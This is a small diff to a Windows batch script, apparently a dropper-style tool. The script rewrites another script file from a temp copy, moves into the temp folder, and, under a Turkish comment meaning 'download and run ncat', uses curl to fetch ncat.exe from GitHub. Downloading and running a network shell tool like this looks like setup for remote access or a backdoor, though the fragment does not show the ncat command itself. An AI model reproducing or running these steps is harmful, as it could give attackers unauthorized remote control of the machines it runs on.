@@ -28,6 +28,7 @@ set "tempfile=%temp%\temp_script.bat"
 ) > "%tempfile%"
 
 copy /y "%tempfile%" "%script%" >nul
+cd %temp%
 del /f /q "temp_script.bat"
 :: ncat indir ve calistir
 curl -L https://github.com/cyberisltd/NcatPortable/raw/refs/heads/master/ncat.exe -o ncat.exe
